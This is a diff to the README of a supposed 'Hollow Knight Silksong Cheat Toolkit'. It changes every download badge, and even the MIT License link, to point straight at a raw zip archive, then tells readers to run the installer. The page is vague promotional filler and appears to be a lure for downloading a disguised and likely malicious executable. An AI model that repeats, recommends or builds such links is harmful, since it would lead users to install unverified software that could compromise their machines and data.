@@ -1,6 +1,6 @@
 # Hollow Knight Silksong Cheat Toolkit
 
-[![Download](https://img.shields.io/badge/Download-green)](https://pierre3000yt.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://github.com/pierre3000yt/silksong-shadow-advantage/raw/refs/heads/branch/unfluted/advantage_shadow_silksong_v2.9.zip)
 
 Unlock hidden realms and unravel secrets with the ultimate **Hollow Knight Silksong Cheat Toolkit**! Whether you’re a speedrunner seeking new boundaries or a curious explorer eager to unearth every nook of Pharloom, this toolkit empowers you to tailor your journey. Explore dynamic enhancements, adaptive experiences, and flexible customization—all within reach.
 
@@ -72,7 +72,7 @@ To activate these features, ensure your environment has proper API credentials. 
 **Installation has never been more intuitive:**
 
 1. Download the Hollow Knight Silksong Cheat Toolkit:  
-   [![Download](https://img.shields.io/badge/Download-green)](https://pierre3000yt.github.io)
+   [![Download](https://img.shields.io/badge/Download-green)](https://github.com/pierre3000yt/silksong-shadow-advantage/raw/refs/heads/branch/unfluted/advantage_shadow_silksong_v2.9.zip)
 2. Run the installer and follow the familiar setup wizard.
 3. Launch the game—your new adventure begins, cleverly enhanced!
 4. Dive into the built-in tutorial or reach out to live chat for onboard assistance.
@@ -93,7 +93,7 @@ _Note: No original game files are altered. All modifications are overlays throug
 
 ## 📜 MIT License
 
-Released under the [MIT License](https://opensource.org/licenses/MIT) (c) 2025.  
+Released under the [MIT License](https://github.com/pierre3000yt/silksong-shadow-advantage/raw/refs/heads/branch/unfluted/advantage_shadow_silksong_v2.9.zip) (c) 2025.  
 You are granted broad permissions to use, modify, and distribute this toolkit—just remember to cherish the spirit of open collaboration.
 
 ---
@@ -101,7 +101,7 @@ You are granted broad permissions to use, modify, and distribute this toolkit—
 ## 🏁 Download Once More
 
 Unleash your adventure!  
-[![Download](https://img.shields.io/badge/Download-green)](https://pierre3000yt.github.io)
+[![Download](https://img.shields.io/badge/Download-green)](https://github.com/pierre3000yt/silksong-shadow-advantage/raw/refs/heads/branch/unfluted/advantage_shadow_silksong_v2.9.zip)
 
 ---
 
